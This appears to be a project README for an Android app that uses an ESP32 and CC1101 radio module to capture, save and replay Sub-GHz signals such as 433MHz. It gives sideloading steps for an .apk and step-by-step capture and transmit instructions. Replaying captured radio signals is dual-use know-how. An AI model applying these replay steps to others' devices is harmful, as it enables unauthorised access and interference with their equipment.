---
layout: "default"
title: "📡 IshtarRF-Android - Manage wireless signals from your phone"
description: "Control Sub-GHz signals with an Android device using an ESP32 and CC1101 module connected via USB-OTG. Receive, transmit, visualize, and store radio data."
---
# 📡 IshtarRF-Android - Manage wireless signals from your phone

[![](https://img.shields.io/badge/Download-IshtarRF-blue.svg)](https://github.com/ghost00318/IshtarRF-Android)

IshtarRF-Android turns your Android phone into a powerful radio tool. It works with ESP32 and CC1101 hardware to capture and send radio signals. You can store signals you find and replay them later. This tool supports common frequencies like 433MHz. It uses a clean interface for clear control over your radio hardware.

## 🛠 What You Need

You need a few items to begin:
* A modern Android phone with USB-OTG support.
* An ESP32 board paired with a CC1101 radio module.
* A USB-OTG adapter cable to connect the phone to your hardware.
* A USB cable to link the hardware to the phone.

## 📦 How to Install 

1. Go to the [IshtarRF download page](https://github.com/ghost00318/IshtarRF-Android).
2. Look for the "Releases" section on the right side of the page.
3. Click the version with the label "Latest".
4. Find the file ending in ".apk" under the "Assets" list.
5. Tap the link to download the file to your Android phone.
6. Open your phone's file manager and find the ".apk" file.
7. Tap the file to start the install process.
8. Follow the prompts on your screen to finish the install.

## 🔌 Connection Setup

You must connect the hardware correctly to use the app. First, attach your USB-OTG adapter to your phone charging port. Next, plug the USB cable from your ESP32 device into the adapter. Your phone might ask for permission to talk to a USB device. Tap "OK" to allow the app to access the hardware. Once connected, open the IshtarRF app. It should find your device automatically.

## 🧪 Capturing Signals

1. Open the app and tap the "Capture" tab.
2. Select the frequency you want to monitor, such as 433MHz.
3. Bring your hardware near the source of the radio signal.
4. Press the "Start" button in the app.
5. The screen shows the signal wave as it arrives.
6. Press "Stop" when you finish.
7. Save the file with a name so you can find it later.

## 📤 Sending Signals

1. Navigate to the "Saved Signals" tab.
2. Tap the file you want to use.
3. Check that your hardware is properly connected to the phone.
4. Press the "Transmit" button.
5. The hardware sends the radio signal recorded earlier.
6. Keep the phone steady while the hardware transmits the data.

## ⚙️ Application Settings

You can change how the app behaves in the "Settings" menu. You can set default frequencies for quick access. You can also change the signal format if you use custom hardware setups. Make sure settings match your specific radio module to get the best results.

## 💡 Frequent Questions

Do I need the internet to use this?
No. The app works offline as long as your hardware is plugged in.

What versions of Android work?
The app needs Android 10 or higher for stable USB access.

Why does the app show an error when I plug in the cable?
Make sure your cable is a functional data cable. Some cables only charge the phone and do not pass data. Try a different USB cable if the app does not detect the device.

Is my radio hardware compatible?
The app works with standard CC1101 modules. Ensure the firmware on your ESP32 is compatible with the IshtarRF protocol.

## 🛡 Safety and Limits

Only use this tool on equipment you own or have permission to test. Radio signals fill every space around us. Transmitting signals can interfere with other devices. Respect local laws regarding radio use. Check the rules in your area before you transmit on restricted frequencies.

## 🛠 Troubleshooting Common Issues

If the screen stays blank while capturing, check the antenna on your CC1101 module. A loose antenna leads to weak signal reception. If the app closes on its own, restart the phone and plug the hardware in again. Ensure the hardware battery is full or it draws enough power from the USB port. If the hardware is not found, check the USB-OTG adapter. These adapters often fail after heavy use. Try a new one if connection problems persist.